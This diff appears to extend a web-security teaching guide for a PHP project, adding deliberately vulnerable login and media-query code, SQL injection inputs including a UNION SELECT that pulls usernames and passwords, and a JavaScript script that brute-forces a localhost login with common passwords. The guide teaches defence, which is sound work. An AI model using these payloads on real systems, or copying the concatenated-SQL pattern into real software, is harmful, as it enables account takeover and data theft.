@@ -19,26 +19,54 @@ require_once __DIR__ . '/dbConnect.php';
 $username = $_POST['username'];
 $password = $_POST['password'];
 
-$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$sql = "SELECT * FROM Users WHERE username = '$username' AND password = '$password'";
 $STH = $DBH->query($sql);
 $user = $STH->fetch(PDO::FETCH_ASSOC);
+print_r($user);
 ?>
 ```
 
 How to exploit the previous code:
 
-```sql
+```text
+username: username
+password: password' OR '1'='1
+```
+
+```text
 username: admin' OR '1'='1
 password: password
 ```
 
-The previous code will return all users from the database because the query will be:
+Test the previous code with Postman.
 
-```sql
-SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'password'
+Another example: 
+
+```php
+<?php
+    ini_set('display_errors', 1);
+    error_reporting(E_ALL);
+    global $DBH;
+    require_once __DIR__ . '/../db/dbConnect.php';
+    
+    $type = $_GET['type'];
+    
+    $sql = "SELECT * FROM MediaItems WHERE media_type = '$type';";
+    echo $sql;
+    $STH = $DBH->query($sql);
+       while ($row = $STH->fetch(PDO::FETCH_ASSOC)) {
+       print_r($row);
+    }
+?>
 ```
 
-To prevent SQL injection, you should use prepared statements.
+How to exploit the previous code:
+
+```text
+http://localhost/folder/getMediaItems.php?type='UNION SELECT null, username, password, null, null, null, null, null FROM Users; --
+```
+
+**To prevent SQL injection, you should use prepared statements and validate user input before interacting with the database.**
 
 ---
 
@@ -179,6 +207,49 @@ if (move_uploaded_file($tmp_name, $destination)) {
 }
 
 ?>
+```
+
+---
+
+### Bruteforce Attacks
+
+Bruteforce attacks are a type of attack where an attacker tries to guess the user's password by trying different combinations of characters. This can lead to unauthorized access to the website.
+
+To prevent bruteforce attacks, you should always use strong passwords and implement account lockout policies. You can also use CAPTCHA or two-factor authentication to prevent automated bruteforce attacks.
+
+Brute foce attack example:
+
+```JavaScript
+const url = 'http://localhost/folder/login.php';
+
+const testData = [
+  'password',
+  '123456',
+  'password123',
+  'admin',
+  'qwerty',
+  'password1234',
+  'password12345',
+];
+
+const login = async (password) => {
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: 'username=admin&password=' + password,
+    });
+    const result = await response.text();
+    console.log(result);
+  } catch (error) {
+    console.error(error);
+  }
+};
+
+testData.forEach(data => login(data));
+
 ```
 
 ---
